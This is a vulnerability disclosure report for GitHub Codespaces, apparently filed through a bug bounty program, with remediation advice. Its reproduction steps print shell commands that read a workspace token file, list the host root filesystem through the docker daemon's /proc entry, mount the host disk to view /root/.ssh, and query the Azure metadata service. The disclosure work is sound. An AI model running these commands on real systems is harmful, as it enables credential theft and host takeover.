github.com

Improper Access Control - Generic [CWE-284](https://cwe.mitre.org/data/definitions/284.html "Learn more about this weakness in a new browser tab")

CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/CR:H/IR:H/AR:H

251105_evidence_archive
## Description: 
Affected: GitHub Codespaces on ~2025-11-04T16:00 (UTC+3)

All credentials identified during testing were revoked prior to submission on 2025-11-06T01:38:23 (UTC+3).

Attacker who can run code in a Codespace can read persisted tokens, access docker daemon socket and host filesystem, and query cloud instance metadata. Combining these may allow repo/CI token theft and host takeover.

Executing an arbitrary shell within a Codespace (normal usage), they gain access to **plaintext GitHub tokens** within the workspace (e.g., ```/workspaces/.codespaces/shared/.env```), the platform's shared or **mounted docker socket** (```/var/run/docker.sock```), and a host filesystem mount (```/mnt/host```). Additionally, VM metadata can be retrieved from the Codespace environment via calls to the **Azure IMDS (169.254.169.254)**. When these three components are combined, repository/CI secrets exfiltration and host compromise become possible. Proof-of-concept outputs are attached.

A misconfiguration in the Codespaces runtime allowed the container to access host block devices / host filesystem and exposed runtime GitHub tokens in workspace-shared env files. Combined with containers running with broad capabilities (NoNewPrivs not enforced, seccomp disabled) and an **exposed sshd**, this enables a Codespace user to read host root filesystem (e.g., ```/root/.ssh```), exfiltrate **GITHUB_TOKEN/CODESPACE_TOKEN** and perform host takeover and repo/CI compromise.

I did not perform any exploitation that modifies system state or exfiltrates secrets. All evidence was gathered read-only and tokens were revoked prior to submission.

## Steps To Reproduce:
1. Open the repository in GitHub and start a shell on Codespace via "Code with agent".
2. The Codespace user context was able to obtain root via sudo without password in this environment
3. Check the contents of .env:
```Bash
root ➜ / $ cat /workspaces/.codespaces/shared/.env
***REDACTED***
```
4. Verify the existence of the Docker socket:
```Bash
root ➜ / $ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Nov  4 20:44 /var/run/docker.sock
```
```Bash
root ➜ / $ [ -S /var/run/docker.sock ] && echo "docker.sock present"
docker.sock present
```
```Bash
root ➜ / $ docker version
Client:
...
Server:
...
```
5. Verify dockerd rootfs access (if dockerd PID is found):
```Bash
root ➜ / $ ps aux | grep dockerd | grep -v grep #dockerd PID
root          58  0.0  0.4 2115500 76416 ?       Sl   20:44   0:00 dockerd --dns 168.63.129.16
```
```Bash
root ➜ / $ ls -la /proc/58/root/
...
```
6. Check the host filesystem mount:
```Bash
root ➜ / $ mount | grep -v overlay | grep -v proc | grep -v sysfs
...
```
```Bash
root ➜ / $ lsblk
...
```
```Bash
root ➜ / $ mkdir -p /mnt/host
root ➜ / $ mount /**REDACTED** /mnt/host
root ➜ / $ ls /mnt/host
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  workspaces
root ➜ / $ ls /mnt/host/root/.ssh
authorized_keys
```
7. IMDS (Azure metadata) Query:
```Bash
root ➜ / $ curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -n 40
***REDACTED***
```

I reproduced this on a fresh Codespace created from "https://github.com/canomer/VERASER-VeraCrypt-Secure-Copy-Delete-Plugin" at ~2025-11-05T20:00 UTC+3

## Suggested Remediation
1. Do not persist tokens in workspace files : avoid storing GITHUB_TOKEN or any PAT in /workspaces/.codespaces/shared/*.env. Use ephemeral secrets / GitHub Secrets and ephemeral short-lived scanning tokens. (Cleartext storage fix.)
2. Do not bind host docker.sock into tenant Codespaces : use OCI sandboxing or a separate privileged service with strict access control. If docker access is required, use isolated dind with no host socket.
3. Remove host root filesystem mount from Codespaces containers : or ensure it's mounted read-only and only for admin/owner flows with justification. Prefer not mounting at all.
4. Limit IMDS exposure : ensure Codespaces containers are network-isolated from IMDS, or enforce IMDSv2 with metadata hop restriction.
5. Audit token scopes & rotate : rotate any leaked tokens and implement short lifetimes.

## Impact
Confidentiality: high -> repo secrets / tokens and host secrets readable.
Integrity / Availability: high -> host compromise enables code injection, tampering.
Overall: host takeover + token exfiltration -> critical.

## Proof-of-impact:
- With the **```.env```** token: attacker can call GitHub APIs, read repo contents, trigger workflows, access packages (scope dependent). With access to the docker daemon socket, an attacker could create a container that mounts host filesystems and access host secrets.
- With **```docker.sock```** + ability to run ```malicious command``` an attacker can mount host FS and write a persistent backdoor or extract host secrets. (Dockerd rootfs listing shows host-level artifacts.)
- With **```/mnt/host```** already mounted, attacker can directly read host SSH keys (e.g. **```/mnt/host/root/.ssh/authorized_keys```**) and other sensitive files.
- **IMDS** access can reveal cloud / instance metadata and potentially (if not properly restricted) tokens/managed-identity flows.